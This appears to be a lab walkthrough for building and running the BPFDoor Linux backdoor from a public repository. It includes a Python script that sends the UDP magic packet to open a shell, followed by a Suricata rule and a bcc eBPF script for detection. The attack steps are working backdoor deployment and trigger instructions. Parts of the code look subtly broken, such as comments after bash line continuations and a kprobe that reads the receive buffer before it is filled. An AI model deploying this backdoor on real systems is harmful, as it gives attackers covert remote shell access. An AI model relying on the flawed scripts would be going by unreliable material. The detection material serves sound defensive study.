Below is an example of a PoC (Proof-of-Concept) setup using the malwaredevil/BPFDoor-Backdoor repository.  
→ **Run only in an isolated test VM** (e.g., VirtualBox/KVM) or Docker container!

---

## 1. Test Environment Setup

- **OS**: Ubuntu 22.04 (or Rocky Linux 9)
- **Required Packages**:
  ```bash
  sudo apt-get update
  sudo apt-get install -y build-essential git python3 python3-pip bpfcc-tools
  ```

- **Network**: Configure the VM with host-only or internal bridge mode to block external access

---

## 2. Clone & Build the Backdoor Source

```bash
git clone https://github.com/malwaredevil/BPFDoor-Backdoor.git
cd BPFDoor-Backdoor
make
# → Output: ./bpfdoor
```

---

## 3. Run the Backdoor (Victim)

```bash
# Run with root privileges
sudo ./bpfdoor \
  --listen-ip 0.0.0.0 \   # IP to listen on
  --listen-port 9999      # Magic packet port
```

> In this state, it will open a shell (Back-Connect) when it receives a “magic sequence” on the specified UDP port.

---

## 4. Send Magic Packet (Attacker)

```bash
# send_magic.py
import socket

MAGIC = b'MAGICPING'          # Match the repository code  
TARGET = ("192.168.56.101", 9999)  # Victim IP:Port

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(MAGIC, TARGET)
print("sent magic packet")
```

```bash
python3 send_magic.py
```

→ On the Victim side, check if a shell appears using `nc` or similar tools.

---

## 5. Detection Scenario

### 5.1 Suricata Rule

```yaml
# /etc/suricata/rules/bpfdoor.rules
alert udp any any -> any 9999 \
  (msg:"[PoC] BPFDoor magic packet"; content:"MAGICPING"; sid:9000001; rev:1;)
```

```bash
sudo suricata -c /etc/suricata/suricata.yaml --af-packet any -S /etc/suricata/rules/bpfdoor.rules
```

---

### 5.2 Real-time eBPF Monitoring (using bcc)

```python
# detect_bpfdoor.py
from bcc import BPF

prog = r"""
int kprobe__sys_recvfrom(struct pt_regs *ctx) {
    // buf pointer is PT_REGS_PARM2(ctx)
    char buf[8];
    bpf_probe_read(&buf, sizeof(buf), (void *)PT_REGS_PARM2(ctx));
    // Check for "MAGICPIN" (the final G is in the next byte)
    if (buf[0]=='M' && buf[1]=='A' && buf[2]=='G' && buf[3]=='I'
     && buf[4]=='C' && buf[5]=='P' && buf[6]=='I' && buf[7]=='N') {
        bpf_trace_printk(">> BPFDoor trigger detected\\n");
    }
    return 0;
}
"""
b = BPF(text=prog)
print("Tracing recvfrom() for magic… Ctrl-C to exit")
b.trace_print()
```

```bash
sudo python3 detect_bpfdoor.py
```

→ Each time the magic packet is received, a `>> BPFDoor trigger detected` log is printed

---

## 6. Full PoC Flow

1. Start monitoring on the **Victim VM** using Suricata (or the eBPF script)  
2. Run `sudo ./bpfdoor` on the **Victim VM**  
3. Execute `python3 send_magic.py` on the **Attacker VM**  
4. Suricata alert triggered or eBPF log observed → Attack detected

---

